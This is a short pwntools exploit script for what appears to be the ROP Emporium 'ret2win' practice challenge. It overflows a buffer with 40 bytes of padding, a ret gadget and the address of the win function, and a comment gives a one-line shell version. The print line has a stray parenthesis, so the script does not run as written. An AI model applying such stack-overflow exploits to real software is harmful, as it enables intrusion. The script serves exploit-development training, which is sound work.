from pwn import *

elf = ELF('ret2win')                #context.binary

p = process(elf.path)

#Prepare the payload
payload = b"A"*40                   #creates the junk part of the payload
payload += p64(0x40053e)            #ret address ROP chain. Necessary because we are in Ubuntu 20.04 64bits
payload += p64(elf.symbols.ret2win) #address to ret2win() function

# Send the payload
p.sendline(payload)                 #send the payload to the process

response = p.recvall()              #gets all messages in the process

#  print(re.search("(ROPE{.*?})",response.decode()))
print(response.decode()))

#One line, command line solution:
#python3 -c 'print("A"*40 + "\x3e\x05\x40\x00\x00\x00\x00\x00" + "\x56\x07\x40\x00\x00\x00\x00\x00")' | ./ret2win
